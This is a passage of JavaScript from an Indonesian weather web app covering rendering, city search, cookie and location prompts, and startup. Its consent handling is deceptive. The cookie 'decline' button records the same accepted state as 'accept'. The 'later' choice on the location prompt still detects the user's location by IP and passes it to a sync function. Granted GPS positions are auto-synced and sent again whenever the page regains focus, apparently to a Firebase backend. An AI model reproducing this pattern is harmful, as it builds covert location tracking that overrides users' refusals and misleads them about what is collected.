    else if (c.includes('snow')) document.body.classList.add('theme-snow');
    else if (c.includes('thunder')) document.body.classList.add('theme-thunder');
  },

  showDisclaimer(text) {
    if (this.el.disclaimerText) this.el.disclaimerText.textContent = Safe.str(text);
    if (this.el.accuracyDisclaimer) this.el.accuracyDisclaimer.classList.remove('hidden');
  },

  hideDisclaimer() {
    if (this.el.accuracyDisclaimer) this.el.accuracyDisclaimer.classList.add('hidden');
  },

  showSkeleton() {
    if (this.el.cityName) this.el.cityName.textContent = '—';
    if (this.el.description) this.el.description.textContent = 'Memuat...';
    if (this.el.temperature) this.el.temperature.textContent = '--°';
    if (this.el.humidity) this.el.humidity.textContent = '—';
    if (this.el.wind) this.el.wind.textContent = '—';
    if (this.el.feelsLike) this.el.feelsLike.textContent = '—';
    if (this.el.forecastList) {
      this.el.forecastList.innerHTML = Array(4).fill(0).map(() => `
        <div class="forecast-item forecast-skeleton">
          <div class="skel-line skel-time"></div>
          <div class="skel-icon"></div>
          <div class="skel-line skel-temp"></div>
        </div>
      `).join('');
    }
    if (this.el.weatherCard) this.el.weatherCard.classList.remove('hidden');
  },

  renderForecastOnly(list) {
    if (!this.el.forecastList || !Array.isArray(list) || list.length === 0) return;

    const slots = list.slice(0, 8);
    this.el.forecastList.innerHTML = slots.map(item => {
      const itemTemp = Safe.num(item?.main?.temp, 0);
      const itemIcon = Safe.str(item?.weather?.[0]?.icon, '01d');
      const itemDesc = Safe.str(item?.weather?.[0]?.description, '—');
      const dtRaw = item?.dt;
      const dtMs = dtRaw ? Safe.num(dtRaw, 0) * 1000 : Date.now();
      const d = new Date(isNaN(dtMs) ? Date.now() : dtMs);
      const hh = String(d.getHours()).padStart(2, '0');

      return `
        <div class="forecast-item">
          <div class="forecast-time">${hh}:00</div>
          ${Icon.svg(itemIcon, 42)}
          <div class="forecast-temp">${this.toUnit(itemTemp)}${this.unitSymbol()}</div>
          <div class="forecast-desc">${itemDesc}</div>
        </div>`;
    }).join('');
  },

  render(current, forecast, meta = {}) {
    if (!current || !current.weather || !Array.isArray(current.weather) || !current.weather[0]) {
      console.warn('[render] data cuaca tidak valid:', current);
      return;
    }

    State.lastData = { current, forecast, meta };

    const temp = Safe.num(current?.main?.temp, 0);
    const feelsLike = Safe.num(current?.main?.feels_like, temp);
    const humidity = Safe.num(current?.main?.humidity, 0);
    const windSpeed = Safe.num(current?.wind?.speed, 0);
    const description = Safe.str(current?.weather?.[0]?.description, 'Tidak diketahui');
    const iconCode = Safe.str(current?.weather?.[0]?.icon, '01d');
    const weatherMain = Safe.str(current?.weather?.[0]?.main, 'Clear');
    const cityName = Safe.str(current?.name, 'Lokasi') +
                     (current?.sys?.country ? ', ' + Safe.str(current.sys.country) : '');

    if (this.el.cityName) this.el.cityName.textContent = cityName;
    if (this.el.description) this.el.description.textContent = description;
    if (this.el.temperature) this.el.temperature.textContent = `${this.toUnit(temp)}${this.unitSymbol()}`;
    if (this.el.humidity) this.el.humidity.textContent = String(humidity);
    if (this.el.wind) this.el.wind.textContent = windSpeed.toFixed(1);
    if (this.el.feelsLike) this.el.feelsLike.textContent = this.toUnit(feelsLike);
    if (this.el.currentIconUse) this.el.currentIconUse.setAttribute('href', Icon.fromCode(iconCode));
    this.setTheme(weatherMain);

    if (meta.source === 'ip') {
      this.showDisclaimer('Lokasi berdasarkan IP — akurasi terbatas (level kota)');
    } else if (meta.source === 'manual') {
      this.showDisclaimer('Cuaca berdasarkan kota yang Anda pilih');
    } else {
      this.hideDisclaimer();
    }

    if (this.el.forecastList) {
      const list = Safe.arr(forecast?.list);
      if (list.length > 0) {
        this.renderForecastOnly(list);
      } else {
        this.el.forecastList.innerHTML = Array(4).fill(0).map(() => `
          <div class="forecast-item forecast-skeleton">
            <div class="skel-line skel-time"></div>
            <div class="skel-icon"></div>
            <div class="skel-line skel-temp"></div>
          </div>
        `).join('');
      }
    }

    if (this.el.weatherCard) this.el.weatherCard.classList.remove('hidden');
  },

  toggleUnit() {
    State.unit = State.unit === 'C' ? 'F' : 'C';
    if (this.el.unitToggle) this.el.unitToggle.textContent = State.unit === 'C' ? '°C' : '°F';
    if (State.lastData) {
      this.render(State.lastData.current, State.lastData.forecast, State.lastData.meta);
    }
  }
};

/* ============================================================
   SEARCH
   ============================================================ */
const Search = {
  async query(q) {
    const query = Safe.str(q).toLowerCase().trim();
    if (query.length < 2) return [];

    const results = [];

    const indoMatches = REGIONS.filter(r =>
      Safe.str(r[0]).toLowerCase().includes(query) ||
      Safe.str(r[2]).toLowerCase().includes(query) ||
      Safe.str(r[3]).toLowerCase().includes(query)
    ).slice(0, 6);

    indoMatches.forEach(r => {
      results.push({
        name: r[0],
        adm4: r[1],
        kabupaten: r[2],
        provinsi: r[3],
        type: 'id',
        displayName: `${r[0]}, ${r[2]}, ${r[3]}`
      });
    });

    if (results.length < 3) {
      try {
        const qs = new URLSearchParams({ q, limit: 5, appid: APP_CONFIG.OWM_KEY });
        const res = await fetchWithTimeout(`${APP_CONFIG.OWM_GEO}/direct?${qs}`, {}, 5000);
        const data = await res.json();
        if (Array.isArray(data)) {
          data.forEach(d => {
            const name = Safe.str(d?.name);
            if (!name) return;
            if (results.find(r => r.name.toLowerCase() === name.toLowerCase())) return;

            results.push({
              name,
              lat: Safe.num(d.lat),
              lon: Safe.num(d.lon),
              country: Safe.str(d.country),
              state: Safe.str(d.state),
              type: 'global',
              displayName: `${name}${d.state ? ', ' + d.state : ''}, ${d.country}`
            });
          });
        }
      } catch (e) {
        console.warn('[search] OWM error:', e.message);
      }
    }

    return results;
  },

  render(results) {
    if (!UI.el.searchResults) return;

    if (!Array.isArray(results) || results.length === 0) {
      UI.el.searchResults.innerHTML = '<div class="search-empty">Kota tidak ditemukan. Coba nama lain.</div>';
      return;
    }

    UI.el.searchResults.innerHTML = results.map((r, i) => {
      const name = Safe.str(r.name);
      const kab = Safe.str(r.kabupaten);
      const prov = Safe.str(r.provinsi);
      const state = Safe.str(r.state);
      const country = Safe.str(r.country);

      let subtitle = '';
      if (kab) subtitle += ', ' + kab;
      if (prov) subtitle += ', ' + prov;
      if (state && !kab) subtitle += ', ' + state;
      if (country) subtitle += ', ' + country;

      const flag = r.type === 'id' ? '<span class="loc-region">ID</span>' : '';

      return `
        <div class="search-result-item" data-idx="${i}">
          <svg width="14" height="14" aria-hidden="true"><use href="#i-map-pin"/></svg>
          <span>${name}${subtitle}</span>
          ${flag}
        </div>
      `;
    }).join('');

    UI.el.searchResults.querySelectorAll('.search-result-item').forEach((el, i) => {
      el.addEventListener('click', () => {
        const r = results[i];
        UI.hideSearchModal();
        App.loadSelected(r);
      });
    });
  }
};

/* ============================================================
   APP
   ============================================================ */
const App = {
  busy: false,

  async loadSelected(region) {
    if (region.type === 'id') {
      UI.setStatus(`Memuat cuaca ${region.name}...`);

      try {
        const adm4 = region.adm4 + '.0001';
        const data = await WeatherAPI.fetchBMKGByAdm4(adm4);

        if (data) {
          const current = WeatherAPI.parseBMKG(data, [
            region.name, region.adm4, region.kabupaten, region.provinsi
          ]);

          if (current && current.weather && current.weather[0]) {
            const forecast = { list: WeatherAPI.buildBMKGForecast(data) };
            UI.clearStatus();
            UI.render(current, forecast, { source: 'bmkg' });
            UI.showToast(`✓ Cuaca ${region.name} dari BMKG`);
            return;
          }
        }
      } catch (e) {
        console.warn('[bmkg-load] error:', e.message);
      }

      this.loadByName(`${region.kabupaten},ID`, `${region.name}, ${region.kabupaten}`, 'manual');
    } else {
      this.loadByCoords(region.lat, region.lon, region.displayName, 'manual');
    }
  },

  async loadByCoords(lat, lon, label, source = 'auto') {
    if (this.busy) return;
    this.busy = true;

    UI.showSkeleton();

    try {
      // STEP 1: current dulu (cepat)
      const current = await WeatherAPI.getByCoords(lat, lon, label);
      UI.clearStatus();
      UI.render(current, { list: [] }, { source });

      // STEP 2: forecast menyusul (background)
      WeatherAPI.getForecast(lat, lon).then(forecast => {
        if (forecast && forecast.list && forecast.list.length > 0) {
          UI.renderForecastOnly(forecast.list);
          State.lastData = { ...State.lastData, forecast };
        }
      }).catch(() => {});

    } catch (err) {
      UI.setStatus(err.message || 'Gagal memuat data.', true);
      console.error('[loadByCoords]', err);
    } finally {
      this.busy = false;
    }
  },

  async loadByName(query, label, source = 'manual') {
    if (this.busy) return;
    this.busy = true;

    UI.showSkeleton();

    try {
      const qs = new URLSearchParams({
        q: query,
        appid: APP_CONFIG.OWM_KEY,
        units: APP_CONFIG.UNITS,
        lang: APP_CONFIG.LANG
      });

      // STEP 1: current dulu
      const curRes = await fetchWithTimeout(`${APP_CONFIG.OWM_BASE}/weather?${qs}`, {}, APP_CONFIG.FETCH_TIMEOUT);
      const current = await curRes.json();

      if (current.cod && Number(current.cod) !== 200) {
        throw new Error(WeatherAPI.mapError(current.cod));
      }

      UI.clearStatus();
      UI.render(current, { list: [] }, { source });

      // STEP 2: forecast menyusul
      fetchWithTimeout(`${APP_CONFIG.OWM_BASE}/forecast?${qs}`, {}, APP_CONFIG.FETCH_TIMEOUT)
        .then(r => r.json())
        .then(forecast => {
          if (forecast && forecast.list) {
            UI.renderForecastOnly(forecast.list);
            State.lastData = { ...State.lastData, forecast };
          }
        })
        .catch(() => {});

    } catch (err) {
      UI.setStatus(err.message || 'Gagal memuat data.', true);
      console.error('[loadByName]', err);
    } finally {
      this.busy = false;
    }
  },

  async requestLocation() {
    if (!navigator.geolocation) {
      await this.useIPLocation();
      return;
    }

    UI.setStatus('Mencari lokasi Anda...');

    try {
      // STEP 1: GPS cepat (max 5 detik)
      const quickCoords = await getQuickLocation();

      State.userLocation = quickCoords;
      State.locationGranted = true;
      State.sessionId = getSessionId();
      State.sourceType = 'gps';

      syncLocation(quickCoords, 'gps-quick');
      startAutoSync();

      // Render cepat
      this.loadByCoords(quickCoords.latitude, quickCoords.longitude, 'Lokasi Anda', 'gps');

      // STEP 2: Refine di background (tidak blocking)
      setTimeout(async () => {
        try {
          const accurate = await getAccurateLocation();
          if (accurate?.coords?.accuracy < quickCoords.accuracy) {
            State.userLocation = accurate.coords;
            syncLocation(accurate.coords, 'gps-refined');
            this.loadByCoords(accurate.coords.latitude, accurate.coords.longitude, 'Lokasi Anda', 'gps');
          }
        } catch (e) {}
      }, 2000);

    } catch (err) {
      console.warn('[gps] fallback ke IP:', err.code || err.message);
      await this.useIPLocation();
    }
  },

  async useIPLocation() {
    UI.setStatus('Mendeteksi lokasi Anda...');
    const ip = await IPGeo.fetch();

    if (ip && ip.lat && ip.lon) {
      State.userLocation = { latitude: ip.lat, longitude: ip.lon, accuracy: 5000 };
      State.sessionId = getSessionId();
      State.sourceType = 'ip';

      await syncLocation(
        { latitude: ip.lat, longitude: ip.lon, accuracy: 5000 },
        'ip-fallback',
        { locationName: ip.city }
      );

      const label = ip.city + (ip.region ? ', ' + ip.region : '');
      this.loadByCoords(ip.lat, ip.lon, label, 'ip');
    } else {
      UI.setStatus('Gagal deteksi lokasi. Silakan cari kota manual.', true);
      UI.showSearchModal();
    }
  },

  init() {
    UI.init();

    if (UI.el.startBtn) {
      UI.el.startBtn.addEventListener('click', () => {
        UI.hideLanding();
        UI.showApp();
        if (!State.cookieAccepted) {
          setTimeout(() => UI.showCookieBanner(), 500);
        } else {
          setTimeout(() => UI.showLocationModal(), 400);
        }
      });
    }

    if (UI.el.cookieAccept) {
      UI.el.cookieAccept.addEventListener('click', () => {
        State.cookieAccepted = true;
        localStorage.setItem('cuaca_cookie_ok', '1');
        UI.hideCookieBanner();
        setTimeout(() => UI.showLocationModal(), 300);
      });
    }

    if (UI.el.cookieDecline) {
      UI.el.cookieDecline.addEventListener('click', () => {
        State.cookieAccepted = true;
        localStorage.setItem('cuaca_cookie_ok', '0');
        UI.hideCookieBanner();
        setTimeout(() => UI.showLocationModal(), 300);
      });
    }

    if (UI.el.modalAllow) {
      UI.el.modalAllow.addEventListener('click', () => {
        UI.hideLocationModal();
        this.requestLocation();
      });
    }

    if (UI.el.modalManual) {
      UI.el.modalManual.addEventListener('click', () => {
        UI.hideLocationModal();
        UI.showSearchModal();
      });
    }

    if (UI.el.modalLater) {
      UI.el.modalLater.addEventListener('click', () => {
        UI.hideLocationModal();
        UI.showToast('Mendeteksi lokasi via IP...');
        setTimeout(() => this.useIPLocation(), 400);
      });
    }

    if (UI.el.searchBtn) UI.el.searchBtn.addEventListener('click', () => UI.showSearchModal());
    if (UI.el.searchCancel) UI.el.searchCancel.addEventListener('click', () => UI.hideSearchModal());

    let debounce = null;
    if (UI.el.searchInput) {
      UI.el.searchInput.addEventListener('input', e => {
        clearTimeout(debounce);
        const q = e.target.value.trim();
        debounce = setTimeout(async () => {
          const results = await Search.query(q);
          Search.render(results);
        }, 250);
      });

      UI.el.searchInput.addEventListener('keydown', e => {
        if (e.key === 'Enter') {
          const first = UI.el.searchResults?.querySelector('.search-result-item');
          if (first) first.click();
        }
      });
    }

    if (UI.el.unitToggle) {
      UI.el.unitToggle.addEventListener('click', () => UI.toggleUnit());
    }

    if (UI.el.locationModal) {
      UI.el.locationModal.addEventListener('click', e => {
        if (e.target === UI.el.locationModal) UI.hideLocationModal();
      });
    }
    if (UI.el.searchModal) {
      UI.el.searchModal.addEventListener('click', e => {
        if (e.target === UI.el.searchModal) UI.hideSearchModal();
      });
    }

    const cookieOk = localStorage.getItem('cuaca_cookie_ok');
    if (cookieOk !== null) State.cookieAccepted = true;
  }
};

/* ============================================================
   INIT
   ============================================================ */
document.addEventListener('DOMContentLoaded', () => {
  initFirebase();
  App.init();
});

document.addEventListener('visibilitychange', () => {
  if (!document.hidden && State.locationGranted && State.sourceType === 'gps' && navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      pos => syncLocation(pos.coords, 'visibility-resume'),
      () => {},
      { enableHighAccuracy: false, timeout: 15000, maximumAge: 60000 }
    );
  }
});

window.addEventListener('beforeunload', () => stopAutoSync());